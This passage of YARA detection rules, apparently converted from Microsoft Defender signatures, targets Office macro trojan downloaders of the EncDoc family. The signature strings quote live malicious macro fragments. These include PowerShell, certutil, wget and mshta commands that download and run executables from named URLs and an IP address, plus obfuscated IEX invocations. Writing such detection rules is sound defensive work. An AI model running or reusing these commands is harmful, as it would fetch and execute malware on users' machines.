        $x_1_3 = {3d 73 68 65 6c 6c 28 22 77 73 63 72 69 70 74 61 70 69 68 61 6e 64 6c 65 72 2e 6a 73 22 2c 76 62 6e 6f 72 6d 61 6c 66 6f 63 75 73 29 72 61 6e 67 65 28 22 [0-127] 22 29 2e 76 61 6c 75 65 3d 22 22 72 61 6e 67 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SSMF_2147807743_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SSMF!MTB"
        threat_id = "2147807743"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "(((Run((((((((((\"M\" & \"4\" & \"\"))))))))))))))))))))" ascii //weight: 1
        $x_1_2 = "VB_Name = \"Foglio1" ascii //weight: 1
        $x_1_3 = "= Split(ffinestra, \"8\")" ascii //weight: 1
        $x_1_4 = {63 44 44 20 3d 20 22 54 22 20 26 20 74 74 72 6f 76 76 61 20 26 20 22 4f 28 29 22 [0-3] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_5 = "c = (bN(\"=\" & da, 1 + 7)): fog_T ((di_pago))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAAE_2147807833_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAAE!MTB"
        threat_id = "2147807833"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "b_name=\"module1\"subauto_open()setos=createobject(rnxwudtui(strreverse" ascii //weight: 1
        $x_1_2 = ":sptthathsm\\..\\clac\\23metsys\\swodniw\\:c\")+" ascii //weight: 1
        $x_1_3 = "))+1),1))rnxwudtui=rnxwudtui&chr$(asc(mid$(mdednrysk,czb2figan,1))xorhxrkwtelu)nextc" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PKS_2147808013_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PKS!MTB"
        threat_id = "2147808013"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "-w hi sleep -Se 31;Start-BitsTransfe^r -Source" ascii //weight: 1
        $x_1_2 = "htt`ps://joldishop.com/wp-content/plugins/gata1.e`xe" ascii //weight: 1
        $x_1_3 = "= \"C:\\Users\\Public\\agod.cm\"" ascii //weight: 1
        $x_1_4 = "-Dest C:\\Users\\Public\\Documents\\bornexist.e`xe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PDD_2147808299_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PDD!MTB"
        threat_id = "2147808299"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".Open (ju12Wb7fd)" ascii //weight: 1
        $x_1_2 = "= Environ(Chr((51 - &H4E + &H5C)) & Chr((23 + &H55)) + Chr((&O167 + &O233 - &HA6)) +" ascii //weight: 1
        $x_1_3 = "= Split(ZeWGJJIl584DJq9, Chr((&O115 - &O106 + &O125)))" ascii //weight: 1
        $x_1_4 = "= cache & Chr((&O56 + &O56)) & wYRugr2T(QQOF1e9t2LiX1)" ascii //weight: 1
        $x_1_5 = "= Replace(FtBSIB5KJ2N0S5, Dir(FtBSIB5KJ2N0S5), O4RXMI894xLi3)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAAF_2147808358_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAAF!MTB"
        threat_id = "2147808358"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "vb_name=\"newmacros\"f" ascii //weight: 1
        $x_1_2 = "ewater,tea,cokee,papertowelendf" ascii //weight: 1
        $x_1_3 = "right(jelly,len(jelly)-3)endfunctionfunctionbolts(beer)dooat=oat+snickers(cheesecake(beer))beer=chococake(beer)loopwhilelen(beer)>0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PDB_2147808526_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PDB!MTB"
        threat_id = "2147808526"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell (\"C:\\\\WinDOws\\\\SysTEM32\\\\CMD.exe /V/D/c \"\"seT sKk=script&&seT px=mshta" ascii //weight: 1
        $x_1_2 = "d='hHsvTtP:';GHsvetObjHsvect(c+d+'&&sET UF8=SKUZDSKUZDwweea8ae0f.usmarob.usSKUZD?2SKUZD');}catch(e){}close()" ascii //weight: 1
        $x_1_3 = "SKUZD=/%\"\"<nul > %XMGK%.Hta|CMD /c !px! !XMGK!.HtA \"\"  \"), vbHidden" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PSM_2147808857_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PSM!MTB"
        threat_id = "2147808857"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Frhwse1" ascii //weight: 1
        $x_1_2 = "RGhjgjt1" ascii //weight: 1
        $x_1_3 = "RGhjgjt2" ascii //weight: 1
        $x_1_4 = "TTGEHEHEHFHDG" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PSM_2147808857_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PSM!MTB"
        threat_id = "2147808857"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Replace(Cells(101, 4), \"jqwi" ascii //weight: 1
        $x_1_2 = "Replace(Cells(100, 3), \"oeir" ascii //weight: 1
        $x_1_3 = "sdhjl3kjghkjg" ascii //weight: 1
        $x_1_4 = "fhk3 3g4kuesg" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RVP_2147808866_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RVP!MTB"
        threat_id = "2147808866"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=chr(80)+range(\"c6\").notetextqicv2=\"\"+eeeewqicv3=qicv1&qicv2klsad().execqicv3endfunctionfunctionklsad()asobjectsetklsad=getobject(range(\"c7\").notetext)endfunction" ascii //weight: 1
        $x_1_2 = "=chr(80)+range(\"c6\").notetextuuzu2=\"\"+eeeewuuzu3=uuzu1&uuzu2klsad().execuuzu3endfunctionfunctionklsad()asobjectsetklsad=getobject(range(\"c7\").notetext)endfunction" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SSMG_2147808888_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SSMG!MTB"
        threat_id = "2147808888"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "C:\\ProgramData\\QvSmLRLopPlEfUCtJgOjXaHM.vbs" ascii //weight: 1
        $x_1_2 = "ShellExecuteA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PDP_2147808911_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PDP!MTB"
        threat_id = "2147808911"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"http://18.159.59.253/derek/QyJEqOV5XDT3ygH.bat" ascii //weight: 1
        $x_1_2 = ".exe.exe && Nztmfjwtdtruklmdfsbyidoz.exe.exe\", vbHide)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ASMG_2147808982_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ASMG!MTB"
        threat_id = "2147808982"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "myURL = \"https://www.redcar-electronics.co.uk/download/host.exe" ascii //weight: 1
        $x_1_2 = "fileToLaunch = \"C:\\System\\1.exe" ascii //weight: 1
        $x_1_3 = "Shell fileToLaunch, vbNormalFocus" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PDE_2147809241_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PDE!MTB"
        threat_id = "2147809241"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".executefindtext:=\"3-\",replacewith:=\"\",replace:=2endfunction" ascii //weight: 1
        $x_1_2 = ".executefindtext:=\"*\",replacewith:=\"\",replace:=2endfunction" ascii //weight: 1
        $x_1_3 = {70 75 62 6c 69 63 66 75 6e 63 74 69 6f 6e 73 28 [0-32] 2c [0-32] 29 63 72 65 61 74 65 6f 62 6a 65 63 74 28 [0-32] 2b 61 63 74 69 76 65 64 6f 63 75 6d 65 6e 74 2e 62 75 69 6c 74 69 6e 64 6f 63 75 6d 65 6e 74 70 72 6f 70 65 72 74 69 65 73 28 22 63 61 74 65 67 6f 72 79 22 29 2e 76 61 6c 75 65 29 2e 65 78 65 63 22 63 3a 5c 77 69 6e 64 6f 77 73 5c 65 78 70 6c 6f 72 65 72 22 2b [0-32] 65 6e 64 66 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_4 = {73 74 72 72 65 76 65 72 73 65 28 74 68 69 73 64 6f 63 75 6d 65 6e 74 2e 6b 65 79 77 6f 72 64 73 29 77 69 74 68 61 63 74 69 76 65 64 6f 63 75 6d 65 6e 74 2e 73 61 76 65 61 73 66 69 6c 65 6e 61 6d 65 3a 3d [0-32] 2c 66 69 6c 65 66 6f 72 6d 61 74 3a 3d 32}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ASM_2147809562_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ASM!MTB"
        threat_id = "2147809562"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "mediafire.com/file/vkz7dlmkjj60n27/3.txt/file -UseB -UseDefaultCredentials | &('MMM'.replace('MMM','I')+'dildo'.replace('dildo','EX'))\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_CSM_2147810001_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.CSM!MTB"
        threat_id = "2147810001"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {6d 65 64 69 61 66 69 72 65 2e 63 6f 6d 2f 66 69 6c 65 2f [0-31] 2f ?? 2e 74 78 74 2f 66 69 6c 65 20 2d 55 73 65 42 20 2d 55 73 65 44 65 66 61 75 6c 74 43 72 65 64 65 6e 74 69 61 6c 73 20 7c 20 26 28 27 4d 4d 4d 27 2e 72 65 70 6c 61 63 65 28 27 4d 4d 4d 27 2c 27 49 27 29 2b 27 64 69 6c 64 6f 27 2e 72 65 70 6c 61 63 65 28 27 64 69 6c 64 6f 27 2c 27 45 58 27 29 29 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SSTM_2147811191_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SSTM!MTB"
        threat_id = "2147811191"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 61 74 61 53 70 61 63 65 [0-5] 57 73 63 72 69 70 74 2e 53 68 65 6c 6c [0-5] 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c [0-186] 2e 62 61 74 [0-6] 64 69 72 20 63 3a 5c 26 65 63 68 6f 20}  //weight: 1, accuracy: Low
        $x_1_2 = {26 53 45 54 20 [0-22] 3d 68 65 6c 6c 20 2d 65 26 65 63 68 6f}  //weight: 1, accuracy: Low
        $x_1_3 = {65 63 68 6f 20 [0-128] 26 73 74 61 72 74 2f 42 20 25}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAAL_2147811195_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAAL!MTB"
        threat_id = "2147811195"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "vb_name=\"zjuzn\"attri" ascii //weight: 1
        $x_1_2 = "functionyyzzz(eeeewasstring)dimlfeh()asvariantredimlfeh(4)lfeh(0)=chr(80)+range(\"a7\").hyperlinks(1).nam" ascii //weight: 1
        $x_1_3 = "3),lfeh(4))endfunctionfunctionklsad()asobjectsetklsad=createobject(monday.con" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_AMDF_2147811202_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.AMDF!MTB"
        threat_id = "2147811202"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {70 22 26 22 73 3a 2f 2f [0-223] 22 2c 22}  //weight: 1, accuracy: Low
        $x_1_2 = {70 22 26 22 73 22 26 22 3a 2f 2f [0-223] 22 2c 22}  //weight: 1, accuracy: Low
        $x_1_3 = {70 22 26 22 3a 2f 22 26 22 2f [0-223] 22 2c 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_AMDF_2147811202_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.AMDF!MTB"
        threat_id = "2147811202"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {74 22 26 22 74 70 22 26 22 73 3a 2f 2f [0-223] 2f 22 2c 22 [0-10] 74 22 26 22 74 22 26 22 70 3a 2f 2f [0-223] 2f 22 2c 22 [0-10] 74 74 22 26 22 70 3a 2f 2f [0-223] 2f 22 2c 22 [0-10] 74 22 26 22 74 22 26 22 70 3a 2f 2f [0-223] 2f 22 2c 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_AMDF_2147811202_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.AMDF!MTB"
        threat_id = "2147811202"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ttp://learnviaonline.com/wp-admin/qGb/" ascii //weight: 1
        $x_1_2 = "ttp://kolejleri.com/wp-admin/REvup/" ascii //weight: 1
        $x_1_3 = "ttp://stainedglassexpress.com/classes/05SkiiW9y4DDGvb6/" ascii //weight: 1
        $x_1_4 = "ttp://milanstaffing.com/images/D4TRnDubF/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PDH_2147811472_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PDH!MTB"
        threat_id = "2147811472"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Please Click \"Enable Macros\" To Show The Full Document!" ascii //weight: 1
        $x_1_2 = "POWERshEll.ExE wGet https://superpox.com.br/Cros/ulzhZl7ONsTIadU.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAAM_2147811699_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAAM!MTB"
        threat_id = "2147811699"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "vb_name=\"module3\"dim" ascii //weight: 1
        $x_1_2 = "plf=\".\"ifdir(uu&\"\\moexx\"&plf&\"b\"&\"i\"&\"n\"," ascii //weight: 1
        $x_1_3 = "c=bbvv=\"p.\"&vfendsubsubxcvsdfs()callmm(\"dodro7.r\"&\"u/\")endsubsubdssdf()dimklxasstringklx=\"t\"callmm(\"h\"&\"t\"&klx)e" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PDK_2147811821_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PDK!MTB"
        threat_id = "2147811821"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "_open()olepra=\"run$32#he~.$,#hellexec*un$\"\"@\"\"\"\"https://www.mediafire.com/file/84q23czu9f3eid8/10.htm/file\"\"\"olepra=vba." ascii //weight: 1
        $x_1_2 = "=vba.replace(olepra,\"*\",\"_r\")" ascii //weight: 1
        $x_1_3 = "=epival_.__exec!(olepra)debug.printoutput=rebrain.stdout.readall()endsub" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PDC_2147811828_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PDC!MTB"
        threat_id = "2147811828"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= CLng(sa(\"j\", \"HkEbxlgEw\"))" ascii //weight: 1
        $x_1_2 = "= StrConv(R(), vbUnicode)" ascii //weight: 1
        $x_1_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 73 61 28 22 [0-31] 22 2c 20 22 67 6e 34 63 52 4b 45 42 70 22 29 20 2b 20 73 61 28 22 [0-31] 22 2c 20 22 6e 49 59 58 46 45 51 42 66 22 29 20 2b 20 73 61 28 22 [0-31] 22 2c 20 22 71 30 71 34 44 51 38 74 5a 22 29 20 2b}  //weight: 1, accuracy: Low
        $x_1_4 = "Shell.Run sasa, Style" ascii //weight: 1
        $x_1_5 = "sasa = x0r & h0y & GGIZI" ascii //weight: 1
        $x_1_6 = {3d 20 52 65 70 6c 61 63 65 28 78 30 61 2c 20 73 61 28 22 [0-31] 22 29 2c 20 73 61 28 22 [0-31] 22 29 29 3a 20 78 66 66 20 3d 20 52 65 70 6c 61 63 65 28 78 30 64 2c 20 73 61 28 22 [0-31] 22 29 2c 20 73 61 28 22 [0-31] 22 29 29 3a}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_BSM_2147811924_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.BSM!MTB"
        threat_id = "2147811924"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "//oslobikerental.no.ww18.online4u.no/wp-includes/ID2/ups/IMG00120474.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_BSM_2147811924_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.BSM!MTB"
        threat_id = "2147811924"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "mediafire.com/file/b987f1i3css0lhl/4.txt/file -UseB -UseDefaultCredentials | &('MMM'.replace('MMM','I')+'dildo'.replace('dildo','EX'))\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_POWD_2147812324_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.POWD!MTB"
        threat_id = "2147812324"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "exec (FF)" ascii //weight: 1
        $x_1_2 = "Sub exec(Atc)" ascii //weight: 1
        $x_1_3 = {46 46 20 3d 20 22 6d 73 68 74 61 20 68 74 74 70 3a 2f 2f [0-48] 2f [0-32] 2e 68 74 6d 6c 22}  //weight: 1, accuracy: Low
        $x_1_4 = "Set objStartup = objWMIService.Get(\"Win32_ProcessStartup\")" ascii //weight: 1
        $x_1_5 = "Set objConfig = objStartup.SpawnInstance_" ascii //weight: 1
        $x_1_6 = "objConfig.ShowWindow = 0" ascii //weight: 1
        $x_1_7 = "Set objProcess = objWMIService.Get(\"Win32_Process\")" ascii //weight: 1
        $x_1_8 = "intReturn = objProcess.Create(strCommand, Null, objConfig, intProcessID)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SDS_2147812687_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SDS!MTB"
        threat_id = "2147812687"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Environ(\"UserProfile\") & \"\\gmail.bat\"" ascii //weight: 1
        $x_1_2 = "= sTemp & sBuf & vbCrLf" ascii //weight: 1
